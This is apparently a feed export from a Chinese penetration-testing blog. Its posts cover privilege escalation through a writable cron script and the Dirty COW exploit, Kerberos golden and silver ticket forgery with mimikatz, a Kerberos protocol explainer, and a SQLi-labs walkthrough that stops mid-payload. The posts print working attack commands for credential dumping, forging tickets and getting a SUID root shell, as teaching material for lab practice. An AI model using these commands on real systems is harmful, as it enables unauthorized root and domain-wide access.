    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之内核漏洞</title>
    <link href="/p/3574493e.html"/>
    <url>/p/3574493e.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos协议之黄金票据和白银票据</title>
    <link href="/p/737303c7.html"/>
    <url>/p/737303c7.html</url>
    
    <content type="html"><![CDATA[<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p><h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul><li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li><li>2、域名称    secice.cn</li><li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li><li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li></ul><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt//导出 krbtgt 密码 hash</span>也可以mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" alt="黄金票据利用"></p><p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>也可以mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" alt="黄金票据利用"></p><blockquote><p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p></blockquote><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p><h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul><li>1、域名称        secice.cn</li><li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li><li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li><li>4、伪造的用户名(可以是任意的)</li></ul><p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p><h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p><pre><code class="hljs awk">privilege::debugsekurlsa::logonpasswords也可以mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" alt="白银票据利用"></p><p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p><pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" alt="白银票据利用"></p><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" alt="白银票据利用"></p><p>不仅仅是cifs服务还有其他：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" alt="白银票据利用"></p><p>ldap可以用来dcsync</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol><li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li><li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li><li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li></ol>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="/p/fe98a932.html"/>
    <url>/p/fe98a932.html</url>
    
    <content type="html"><![CDATA[<h2 id="Kerberos-协议简介"><a href="#Kerberos-协议简介" class="headerlink" title="Kerberos 协议简介"></a>Kerberos 协议简介</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos-协议框架"><a href="#Kerberos-协议框架" class="headerlink" title="Kerberos 协议框架"></a>Kerberos 协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数</p><p>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/01.png" alt="Kerberos 协议框架"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，</p><p>验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server</p><p>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/02.png" alt="Kerberos 协议框架"></p><h2 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/03.png" alt="Kerberos 认证流程"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/04.png" alt="The Authentication Service Exchange"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/05.png" alt="The Ticket Granting Service(TGS) Exchange"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/06.png" alt="The Client/Server Authentication Exchange"></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之进阶挑战 54-65 关</title>
    <link href="/p/32046ada.html"/>
    <url>/p/32046ada.html</url>
    
    <content type="html"><![CDATA[<h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span> reset:    <span class="hljs-comment"># 根据时间戳生成 cookie</span>    setcookie(<span class="hljs-string">&#x27;challenge&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, time() - <span class="hljs-number">3600000</span>);<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> cookie 中有 challenge:        <span class="hljs-variable">$sessid</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 生成 cookie </span>        <span class="hljs-variable">$expire</span> = time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>;        <span class="hljs-variable">$hash</span> = data(<span class="hljs-variable">$table</span>,<span class="hljs-variable">$col</span>);        setcookie(<span class="hljs-string">&quot;challenge&quot;</span>, <span class="hljs-variable">$hash</span>, <span class="hljs-variable">$expire</span>);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:        计数器 + <span class="hljs-number">1</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> 有查询成功:        输出查询信息    <span class="hljs-keyword">else</span>：        啥都不输出<span class="hljs-comment"># key 被双重过滤了</span><span class="hljs-variable">$key</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-variable">$key</span> = mysql_real_escape_string(<span class="hljs-variable">$key</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT 1 FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$col1</span>= &#x27;<span class="hljs-subst">$key</span>&#x27;&quot;</span>;</code></pre><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><pre><code class="hljs sql">?id=1&#x27;<span class="hljs-comment">--+</span></code></pre><p><strong>判断字段数</strong></p><pre><code class="hljs sql">?id=1&#x27; order by 3<span class="hljs-comment">--+</span>?id=1&#x27; order by 4<span class="hljs-comment">--+</span></code></pre><p><strong>查询有可注入的字段</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> 